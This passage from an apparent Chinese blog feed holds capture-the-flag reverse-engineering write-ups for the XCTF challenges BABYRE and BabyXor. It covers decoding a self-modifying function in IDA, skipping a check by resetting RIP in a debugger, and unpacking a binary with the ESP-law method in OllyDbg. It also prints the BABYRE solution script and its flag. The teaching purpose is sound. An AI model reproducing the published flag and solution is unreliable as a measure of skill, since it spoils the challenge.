中数据的变化<br>脚本执行前：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE4.png" alt="攻防世界_BABYRE4.png"></p><p>脚本执行后：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE5.png" alt="攻防世界_BABYRE5.png"></p><p>接下来把这些数据转化为代码：<br>从 <code>judge</code> 的首地址 <code>0x600B00</code> 开始，到结尾的位置 <code>0x600BB5</code>，一路按 <code>快捷键 C</code> 将数据转化为代码<br>遇到 IDA 弹窗的，直接转代码，无视即可<br><em>（或者直接在 <code>judge</code> 的首地址 <code>C</code> 一下，IDA 会一路将可以转代码的地址全部转过来，最后 <code>P</code> 一下生成函数）</em></p><p>全部 <code>C</code> 完之后如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE6.png" alt="攻防世界_BABYRE6.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE7.png" alt="攻防世界_BABYRE7.png"></p><p>然后在 <code>judge</code> 首地址的位置，按 <code>快捷键 P</code> 将代码生成函数</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE8.png" alt="攻防世界_BABYRE8.png"></p><p>最后，像正常函数一样按 <code>快捷键 F5</code> 就可以快乐反编译了</p><p>得到 <code>judge()</code> 函数的内容如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE9.png" alt="攻防世界_BABYRE9.png"></p><p>代码逻辑比较简单，定义了 <code>v2 = &quot;fmcd\x7F&quot;</code>，<code>v3 = &quot;k7d;V&amp;#96;np&quot;</code></p><p>将输入异或后要与 <code>v2</code> 相等<br>根据循环次数 14 可知，这里是将 <code>v2</code> 和 <code>v3</code> 拼接起来了</p><p>也可以通过汇编代码查看：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE11.png" alt="攻防世界_BABYRE11.png"></p><p>接下来编写脚本即可</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">key <span class="token operator">=</span> <span class="token string">"fmcd\x7Fk7d;V`;np"</span>  flag <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> i<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h1><p>考虑到 <code>judge</code> 是在程序执行过程中自己解码的，所以可以通过动态调试下断点，先让程序自己解码，然后我们再观察解码后的内容</p><p>由于是 Linux 端的 elf 文件，开启远程调试，远程调试的方法<em>详见《IDA的基础和使用》</em></p><p>在调试之前：<br>先在第一条指令 <code>push    rbp</code> 的地方下一个断点<br>然后在输入 <code>call    ___isoc99_scanf</code> 的地方下断点<br>然后开始调试</p><p>程序开始时停在我们下的第一个断点处</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE12.png" alt="攻防世界_BABYRE12.png"></p><p>在第二个断点处，<code>右键 --&gt; Run to cursor</code> 直接让程序运行到这里</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE13.png" alt="攻防世界_BABYRE13.png"></p><p>可以看到，程序的 <code>RIP</code> 指向了我们第二个断点的地方：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE14.png" alt="攻防世界_BABYRE14.png"></p><p>然后 <code>F8</code> 单步步过</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE15.png" alt="攻防世界_BABYRE15.png"></p><p>Linux 中程序已经开始让我们输入</p><p>这里先随便输入一个值，例如我输入：1</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE16.png" alt="攻防世界_BABYRE16.png"></p><p>程序越过了 <code>scanf</code> 输入，<code>RIP</code> 指向下一条命令</p><p>由于下面的 <code>jnz     short loc_400698</code> 这一条指令会跳转到 <code>loc_400698</code><br>这个位置是输出 “Wrong!” 用的，并且会导致程序直接结束</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE17.png" alt="攻防世界_BABYRE17.png"></p><p>所以我们需要<strong>在 <code>jnz     short loc_400698</code> 这一条指令之后，设置一个新的 <code>RIP</code></strong></p><p>这样一来，输入 “Wrong!” 后，可以迫使程序继续跳转到我们设置的 <code>RIP</code> 的地方，从而绕过输入错误导致的退出<br>但也要注意，我们的目的是让程序自己解码 <code>judge</code> 函数后查看 <code>judge</code> 的内容<br>所以这个 RIP 一定要设置在调用 <code>judge</code> 函数之前，不然无法进入到 <code>judge</code> 函数</p><p>例如，我将 <code>RIP</code> 设置在 <code>jnz     short loc_400698</code> 的后面一句<br>即：地址 <code>0x40067A</code> 处，然后 <code>右键 --&gt; set IP</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE18.png" alt="攻防世界_BABYRE18.png"></p><p>同时，在 <code>call    rdx ; judge</code> 调用 <code>judge</code> 函数的地方 <code>F2</code> 下一个断点<br>然后我们直接 <code>F8</code> 就会跳转到刚刚设置 <code>RIP</code> 的位置，从而绕过 <code>loc_400698</code><br>继续 <code>F8</code> 执行到调用 <code>judge</code> 函数的地方，IDA 会询问是否进入这个地址</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE20.png" alt="攻防世界_BABYRE20.png"></p><p>选择 <code>&quot;Yes&quot;</code>，程序就会进入 <code>judge</code> 函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE21.png" alt="攻防世界_BABYRE21.png"></p><p>这个就是程序自己解码出来的 <code>judge</code> 函数的内容<br>然后选择 <code>judge</code> 函数的内容，使用 <code>快捷键 P</code> 将代码生成函数</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE22.png" alt="攻防世界_BABYRE22.png"></p><p>最后 <code>F5</code> 即可将 <code>judge</code> 函数反汇编</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE23.png" alt="攻防世界_BABYRE23.png"></p><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>flag{n1c3_j0b}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE10.png" alt="攻防世界_BABYRE10.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【攻防世界】BabyXor</title>
      <link href="/posts/5c53cc97.html"/>
      <url>/posts/5c53cc97.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p><mark>使用 ESP 定律法进行脱壳</mark></p></li><li><p>使用 <code>int __cdecl _filbuf(FILE *)</code> 函数实现 <code>get</code> 输入</p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/1c1c2eff3fdc4f1893aa0b72c6c9f116.zip">【攻防世界】BabyXor</a></p><hr><h1 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h1><p>用 exeinfo PE 打开：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor1.png" alt="攻防世界_BabyXor1.png"></p><p>貌似有壳，提示用 DIE v3.x 查看，但是依然检测不出来</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor2.png" alt="攻防世界_BabyXor2.png"></p><p>用 IDA 打开，发现无法反汇编：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor3.png" alt="攻防世界_BabyXor3.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor4.png" alt="攻防世界_BabyXor4.png"></p><p>因为加了壳，IDA 中什么都看不到</p><p>先用 OllyDBG 打开调试：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor5.png" alt="攻防世界_BabyXor5.png"></p><p>首先看到 <code>pushad</code><br><code>pushad</code> 是将所有的寄存器压栈，一般是开始位置<br>在地址 <code>0x0043F01E</code> 之后，有很多 <code>add byte ptr ds:[eax], al</code> 的操作，无法直接看到正常的汇编代码</p><p>但是在地址 <code>0x0043F012</code> 到 <code>0x0043F016</code> 之间可以看到一个循环操作：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">0043F</span><span class="token number">012</span>    <span class="token number">8033</span> <span class="token number">23</span>         xor byte ptr ds<span class="token operator">:</span><span class="token punctuation">[</span>ebx<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token number">0043F</span><span class="token number">015</span>    <span class="token number">43</span>              inc ebx<span class="token number">0043F</span><span class="token number">016</span>  <span class="token operator">^</span> E0 FA           loopdne <span class="token keyword">short</span> babyXor<span class="token punctuation">.</span><span class="token number">0043F</span><span class="token number">012</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里使用循环 xor 来修正代码，所以导致 IDA 无法正常解析</p><p>从 <code>pushad</code> 开始<br><strong>先 F8 单步步过一次</strong>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor6.png" alt="攻防世界_BabyXor6.png"></p><p><strong>观察右侧寄存器窗口，发现 EAX ~ EDI 中只有 ESP 为红色，说明可以使用 ESP 定律进行脱壳</strong></p><p>在寄存器窗口中选中 ESP，<code>右键 --&gt; 数据窗口中跟随</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor7.png" alt="攻防世界_BabyXor7.png"></p><p>注意数据窗口中是否跳转：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor8.png" alt="攻防世界_BabyXor8.png"></p><p>从该地址处的第一个字节开始（我这里是 00），<strong>左键选择任意长度的数据</strong></p><p>然后<code>右键 --&gt; 断点 --&gt; 硬件访问 --&gt; Byte/Word/Dword</code>（三选一，均可）</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor9.png" alt="攻防世界_BabyXor9.png"></p><p>检查一下断点是否成功：<code>调试 --&gt; 硬件断点</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor10.png" alt="攻防世界_BabyXor10.png"></p><p>直接 <code>F9</code> 运行程序<br>然后 <code>F8</code> 连续单步步过找到 OEP（程序的入口点）<br>程序停在地址 <code>0x0043F019</code> 的位置</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor11.png" alt="攻防世界_BabyXor11.png"></p><p>在脱壳之前，先删除前面下的断点：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor12.png" alt="攻防世界_BabyXor12.png"></p><p>在停下的地址处：<code>右键 --&gt; 用 OllyDump脱壳调试进程</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor13.png" alt="攻防世界_BabyXor13.png"></p><p>点击脱壳，并将脱壳后的程序进行保存</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor14.png" alt="攻防世界_BabyXor14.png"></p><p>将保存后的程序用 exeinfo PE 打开：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor15.png" alt="攻防世界_BabyXor15.png"></p><p>已经显示无壳</p><p>用 IDA 打开：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor16.png" alt="攻防世界_BabyXor16.png"></p><p>已经可以被 IDA 正常分析了，脱壳成功</p><p>进入主函数</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor17.png" alt="攻防世界_BabyXor17.png"></p><p>开始的两句作用是输出：”世界上最简单的Xor”<br>注意到后面有一个 <code>if else</code> 语句：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor18.png" alt="攻防世界_BabyXor18.png"></p><p>这个不是很懂，但是在网上看到了比较好的解释：<a href="https://www.cnblogs.com/volcanol/archive/2011/06/09/2076907.html">C语言学习趣事_关于C语言中的输入输出流_续一 - volcanol</a></p><p>这段代码实现的是 <code>getc()</code> 函数，即：获取用户的输入<br>其实根据运行程序时的输出，也大致可以猜到，不影响做题</p><blockquote><p><code>getc()</code></p><p>在 VC 6.0 中有两个 <code>get()</code> 的定义， 一个是宏，一个是函数</p><ol><li>宏的定义如下：<br><code>#define getc(_stream) (--(_stream)-&gt;_cnt &gt;= 0 ? 0xff &amp; *(_stream)-&gt;_ptr++ : _filbuf(_stream))</code></li><li>函数定义如下：<br><code>_CRTIMP int __cdecl getc(FILE *)</code></li></ol><p>在Ｃ语言的各家编译器提供厂商里面有一个不成为的“潜规则”，那就是：<br><strong>如果一个标识符前面是以下划线开头，这样的标识符通常是编译器预定义的宏，或者预定义的标志符</strong></p><p>我们看宏定义，这里用到的宏实际还用到了一个预定义的函数：<br><code>_CRTIMP int __cdecl _filbuf(FILE *)</code></p><p>从这个函数可以看出在 <code>getc()</code> 宏中使用的：<code>_stream</code> 是一个具有文件指针类型性质的预定义标识符</p></blockquote><p>在 IDA 伪代码中，<code>_filbuf(&amp;File)</code> 的定义：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor19.png" alt="攻防世界_BabyXor19.png"></p><p>继续往下：<br><code>v8 = sub_40108C(&amp;unk_435DC0, 56)</code> 函数会执行 <code>sub_401190(a1, a2)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor20.png" alt="攻防世界_BabyXor20.png"></p><p>内容就是简单的移位、异或操作，最后将结果返回给 <code>v8</code><br><code>Src = sub_401041(&amp;unk_435DC0, &amp;dword_435DF8, 0x38u)</code> 函数会执行 <code>sub_401240(a1, a2, Size)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor21.png" alt="攻防世界_BabyXor21.png"></p><p>操作也是移位、异或，将结果返回给 <code>Src</code><br><code>v5 = sub_4010C3(&amp;unk_435DC0, Src, &amp;dword_435E30, 56)</code> 函数会执行 <code>sub_401320(a1, a2, a3, a4)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor22.png" alt="攻防世界_BabyXor22.png"></p><p>跟前面都是差不多的，也是移位、异或，最后将结果返回给 <code>v5</code><br>最后执行 <code>sub_40101E(v8, Src, v5)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor23.png" alt="攻防世界_BabyXor23.png"></p><p>发现三个通过 <code>for</code> 循环的赋值操作<br>同时，三个参数都使用 <code>sub_4010A5()</code> 函数进行了处理，<code>sub_4010A5()</code> 函数会执行 <code>sub_401460(a1)</code></p><p>跟进一下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor24.png" alt="攻防世界_BabyXor24.png"></p><p>这里的 <code>i</code> 是一个指针，<code>a1</code> 也是一个指针</p><p>首先将 <code>i</code> 的初值设置为 <code>a1</code> 所指向的地址（其实就是参数 <code>v8</code>、<code>Src</code>、<code>v5</code> 各自的首地址）<br>for 循环的结束条件就是将 <code>a1</code> 所指向的非 <code>&#39;\0&#39;</code> 元素全部遍历完，也就是 <code>i</code> 指向参数 <code>v8</code>、<code>Src</code>、<code>v5</code> 各自的末尾<br>最后返回的 <code>i - a1</code> 是两个地址的差，差值其实就是字符串的长度</p><p>再结合三个 for 循环的内容，可知：<br><code>sub_40101E(v8, Src, v5)</code> 函数的功能是将 a1( <code>v8</code> )、a2( <code>Src</code> )、a3( <code>v5</code> ) 的内容拼接到 <code>v10</code> 所指向的地址中</p><p>查看一下这三个移位、异或函数所使用的数据<br><code>unk_435DC0</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor25.png" alt="攻防世界_BabyXor25.png"></p><p><code>dword_435DF8</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor26.png" alt="攻防世界_BabyXor26.png"></p><p><code>dword_435E30</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor27.png" alt="攻防世界_BabyXor27.png"></p><p>通过 IDA 生成 Python 列表：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">unk_435DC0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span>dword_435DF8 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span>dword_435E30 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于数据是小端序存放，每组中间间隔的 “0x00, 0x00, 0x00” 是高位<br>即：内存中 <code>&quot;0x1A, 0x00, 0x00, 0x00&quot;</code> 代表 <code>&quot;0x0000001A&quot;</code></p><p>根据 <code>a2 &gt;&gt; 2</code> 也可知，<code>56 &gt;&gt; 2 = 14</code>，每 4 个十六进制一组，共 56 &#x2F; 4 